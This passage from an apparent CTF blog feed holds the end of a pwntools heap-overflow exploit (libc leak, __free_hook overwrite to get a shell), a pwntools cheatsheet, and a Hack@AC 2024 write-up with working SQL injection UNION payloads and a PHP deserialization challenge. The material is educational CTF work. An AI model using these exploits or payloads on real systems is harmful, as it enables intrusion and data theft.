</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">local</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ctf2.whitehats.site&#39;</span><span class="p">,</span> <span class="mi">2005</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">join</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leave</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">get libc leak
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;change your mind: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">exit</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;exit:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">exit</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">exit</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">heap overflow due to gets()
</span></span></span><span class="line"><span class="cl"><span class="s1">control the location of the next chunk to be at __free_hook to pop a shell
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAAAA&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;BBBBB&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;CCCCC&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x21</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;random&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x4f302</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># WH2024{w4ItIng_In_L1n3_f0r_c@t3g0ry_10K}</span>
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Secret Keyword</title>
            <link>https://enxgmatic.github.io/ctf/secret-keyword/</link>
            <pubDate>Tue, 19 Mar 2024 22:51:27 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/ctf/secret-keyword/</guid>
            <description>Huehuehue, here&amp;rsquo;s the second part of the secret keyword:
**REDACTED**
Actually, I&amp;rsquo;m editing the post to redact the secret to prevent certain people from accessing it. If only there was a way for you to go back in time to access the older version of this post&amp;hellip; huehuehue.</description>
            <content type="html"><![CDATA[<p>Huehuehue, here&rsquo;s the second part of the secret keyword:</p>
<!-- Wait... did you think I would actually write it? Of course, I edited the post to conceal the secret. If only there was a way for you to go back in time to access this post... huehuehue. -->
<p><code>**REDACTED**</code></p>
<p>Actually, I&rsquo;m editing the post to redact the secret to prevent <em>certain people</em> from accessing it. If only there was a way for you to go back in time to access the older version of this post&hellip; huehuehue.</p>
]]></content>
        </item>
        
        <item>
            <title>Pwntools Cheatsheet</title>
            <link>https://enxgmatic.github.io/ctf/pwntools-cheatsheet/</link>
            <pubDate>Sun, 03 Mar 2024 17:37:08 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/ctf/pwntools-cheatsheet/</guid>
            <description>This is a very brief cheatsheet and introduction to pwntools for CTFs. I am writing this specifically for Sieberrsec CTF 5.0, but it can be applied for all CTFs.
Install and Import pip install pwntools: to install pwntools, use this command in the terminal
from pwn import *: put this at the top of your python file to import pwntools.
Making connections r = remote(HOST, PORT): connects to a remote connection, with the relevant host and port</description>
            <content type="html"><![CDATA[<p>This is a very brief cheatsheet and introduction to <code>pwntools</code> for CTFs. I am writing this specifically for Sieberrsec CTF 5.0, but it can be applied for all CTFs.</p>
<br>
<h3 id="install-and-import">Install and Import</h3>
<p><code>pip install pwntools</code>: to install pwntools, use this command in the terminal</p>
<p><code>from pwn import *</code>: put this at the top of your python file to import pwntools.</p>
<br>
<h3 id="making-connections">Making connections</h3>
<p><code>r = remote(HOST, PORT)</code>: connects to a remote connection, with the relevant host and port</p>
<ul>
<li>Eg if the CTF tells you to connect to the instance via <code>nc 1.1.1.1 2000</code>, <code>1.1.1.1</code> is the host, and <code>2000</code> is the port</li>
<li>This command is in effect the same as <code>nc</code></li>
</ul>
<p><code>r.interactive()</code>: allows you to interact with the process yourself</p>
<ul>
<li>We usually use this at the very end after we have obtained the shell or when the flag is printed out</li>
</ul>
<br>
<h3 id="elf-manipulation">ELF manipulation</h3>
<p>CTF challenges usually provide an ELF file for you to run. An ELF file is essentially the linux version of an <code>.exe</code> file.</p>
<br>
<p><code>elf = ELF('./NAME')</code>: this allows you to get information about an ELF file of the specified name</p>
<p><code>r = elf.process(stdin=PTY)</code>: this executes the ELF file</p>
<ul>
<li>Usually we use this to test the challenge locally</li>
<li>Then switch to <code>remote(HOST,PORT)</code> to connect to the remote instance</li>
</ul>
<p><code>elf.symbols['FUNCTION']</code>: gets the address of the specified function</p>
<ul>
<li>Eg <code>elf.symbols['main']</code> gives the address of main()</li>
</ul>
<br>
<h3 id="reading-data-and-providing-input">Reading data and providing input</h3>
<p><code>conn.recvline()</code>: reads one line of data</p>
<p><code>conn.recvlines(N)</code>: reads N lines of data</p>
<p><code>conn.recvuntil(VALUE)</code>: reads data until VALUE</p>
<p><code>conn.sendline(VALUE)</code>: sends an input of VALUE</p>
<br>
<h3 id="further-readings">Further readings</h3>
<p>These commands are left as an exercise to the reader to learn more about. For more commands, refer to their <a href="https://docs.pwntools.com/en/stable/">documentation</a>.</p>
<p><code>p64(NUMBER)</code> and <code>p32(NUMBER)</code>: struct unpacking</p>
<p><code>elf.got['write']</code>,<code>elf.plt['write']</code>: get the GOT and PLT addresses</p>
<br>
<h3 id="sample">Sample</h3>
<p>Imagine that you are provided with a file which does this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">n1</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// prints &#34;n1: xx&#34; where xx is the number randomly generated
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;n1: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">n1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What is the value of n1?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// gets an integer input
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// get the flag if input is equal to n1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">n1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print_flag</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So, the file will print the value of n1, and then you will need to input n1 back.</p>
<p>This is how you can use pwntools to solve the challenge:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./challenge&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">local</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># execute the local file</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># connect to the remote instance</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challs.sieberr.live&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get the value of n1</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;n1: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">n1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># input n1</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">n1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># interact with the process yourself, so you can see the value of the flag</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Hack@AC 2024</title>
            <link>https://enxgmatic.github.io/ctf/hack@ac/</link>
            <pubDate>Thu, 29 Feb 2024 17:43:43 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/ctf/hack@ac/</guid>
            <description>Hack@AC 2024 I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(
Additionally, I won the first blood prize for solving the challenge web/Libwary.
🩸 web/Fruit Color Query One of the more interesting sql injection challenges.
Reconnaissance Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.</description>
            <content type="html"><![CDATA[<h1 id="hackac-2024">Hack@AC 2024</h1>
<p>I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(</p>
<p><img src="assets/leaderboard.png" alt=""></p>
<p>Additionally, I won the first blood prize for solving the challenge <a href="#weblibwary"><code>web/Libwary</code></a>.</p>
<h2 id="-webfruit-color-query">🩸 web/Fruit Color Query</h2>
<p>One of the more interesting sql injection challenges.</p>
<h3 id="reconnaissance">Reconnaissance</h3>
<p>Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.</p>
<div style="display:flex;">
    <img src='assets/fruit (1).png' width="48%">
    <img src='assets/fruit (2).png' width="48%">
</div>
<p>However, when you input a different jpg file, the website instead writes <code>Cannot Verify Your Picture is A Fruit. Please Add a Metadata to Your Picture.</code></p>
<img src="assets/fruit (3).png" width="75%">
<p>From my teammate&rsquo;s tinkering, she figured out that the website would refer to the picture&rsquo;s &ldquo;title&rdquo; and &ldquo;subject&rdquo; metadata  to determine the fruit type.</p>
<img src="assets/fruit (4).png" width="60%">
<p>From the sample image, when the &ldquo;title&rdquo; and &ldquo;subject&rdquo; metadata are labelled as <code>apple</code>, the website outputs red. When you change the metadata to <code>banana</code>, the website outputs yellow.</p>
<p>However, when you change the metadata to <code>flag</code> or some other bogus value, the website returns an error.</p>
<img src="assets/fruit (5).png">
<p>That was when my teammate guessed it was probably a SQL Injection challenge.</p>
<br>
<h3 id="sql-injection">SQL Injection</h3>
<p>To solve this challenge, we will make use of a <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION</a> attack, as we need to obtain data from other tables in the database.</p>
<p>First up, we need to figure out what table and column in the database contains the flag. For this, I used <a href="https://www.sqlite.org/schematab.html"><code>sqlite_master</code></a>, a table that stores the schema of the database (this only applies to sqlite, I simply guessed that the application was using that).</p>
<p>My plan was to <code>SELECT sql FROM sqlite_master</code>, which tells us the <code>CREATE TABLE</code> query that was executed. This way, we can see the name and columns of all the tables in the database.</p>
<br>
<p>To execute that, we will edit the metadata of the file to be <code>' UNION SELECT sql FROM sqlite_master --</code>.</p>
<ul>
<li><code>'</code> closes the string</li>
<li><code>UNION SELECT</code> lets us query data outside of the current table we are in</li>
<li><code>sql</code> is the column we are selecting from the table <code>sqlite_master</code></li>
<li><code>--</code> comments out the rest of the query, so as to avoid any errors caused by the end of the query (eg the trailing <code>'</code> at the end)</li>
</ul>
<img src="assets/fruit (7).png">
<br>
<p>Thus, the full query becomes <code>SELECT &lt;colour&gt; FROM &lt;fruit_table&gt; WHERE &lt;fruit&gt;='' UNION SELECT sql FROM sqlite_master--'</code>.</p>
<p>This returns the sql of the table since <code>SELECT &lt;colour&gt; FROM &lt;fruit_table&gt; WHERE &lt;fruit&gt;=''</code> will return nothing.</p>
<br>
<p>When we input the file with the metadata as stated, we get this output:</p>
<img src="assets/fruit (6).png" width="75%">
<p>Nice, we now know the table name is <code>flag</code> and the the column is <code>flag</code> of the datatype <code>TEXT</code> (Click <a href="https://www.programiz.com/sql/create-table">here</a> for more about the CREATE TABLE syntax).</p>
<p>Now, we just need to use another UNION attack, this time to UNION SELECT the flag instead. We adjust the metadata to be <code>' UNION SELECT flag FROM flag--</code>.</p>
<img src="assets/fruit (8).png">
<p>And when we submit the image, the application returns the flag.</p>
<img src="assets/fruit (9).png" width="70%">
<p>Flag: <code>ACSI{sql1_i5_d34d?_1_d0n't_r341ly_Kn0w}</code></p>
<br>
<h3 id="a-short-note-on-union-attacks">A short note on UNION attacks</h3>
<p>When I solved the challenge, and used <code>UNION SELECT sql FROM sqlite_master</code>, it actually returned the sql schema for the fruits table instead of the flag table.</p>
<img src="assets/fruit (11).png" width="70%">
<p><code>UNION SELECT sql FROM sqlite_master</code> returns the sql schema of <u>all</u> the tables in the database (in this case, 2 tables). However, the webpage only returns the first result (between the 2 tables). Thus, it may return the wrong table.</p>
<p>To solve that problem, add <code>LIMIT 1 OFFSET 1</code> to the sql injection query. This basically offsets the result by 1, to grab the 2nd table.</p>
<img src="assets/fruit (10).png" width="70%">
<br>
<h2 id="weblibwary">🩸web/Libwary</h2>
<p>Won the first blood prize for this :D</p>
<h3 id="reconnaissance-1">Reconnaissance</h3>
<p>Pulling up the website, it let us select a book and prints out its contents, one of which is &ldquo;the flag&rdquo;. However, selecting that gives us this:</p>
<img src="assets/libwary (1).png">
<p>Additionally, the website also states our username at the top.</p>
<p>Let&rsquo;s dive into the source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;util.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$option</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;book&#39;</span><span class="p">];</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$option</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;User&#34;</span><span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">(),</span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Libwary<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
</span></span><span class="line"><span class="cl">        <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">            echo $user;
</span></span></span><span class="line"><span class="cl"><span class="cp">        ?&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span> Select a book to read <span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;index.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;book&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span><span class="p">&gt;</span>A Love Story<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;2&#34;</span><span class="p">&gt;</span>The Hackerman<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;3&#34;</span><span class="p">&gt;</span>The Egg<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;4&#34;</span><span class="p">&gt;</span>Exploring the Castle<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;5&#34;</span><span class="p">&gt;</span> The Flag <span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Read&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span> <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">        if ($option != -1){
</span></span></span><span class="line"><span class="cl"><span class="cp">            $book = new Book($option);
</span></span></span><span class="line"><span class="cl"><span class="cp">            echo $book;
</span></span></span><span class="line"><span class="cl"><span class="cp">        }
</span></span></span><span class="line"><span class="cl"><span class="cp">        else{
</span></span></span><span class="line"><span class="cl"><span class="cp">            echo &#34;Please select a book to read&#34;;
</span></span></span><span class="line"><span class="cl"><span class="cp">        }
</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>A post request is sent based on the book we choose. Also, our username is obtained from our PHPSESSID cookie, which is serialized from the User class (shown below).</p>
<ul>
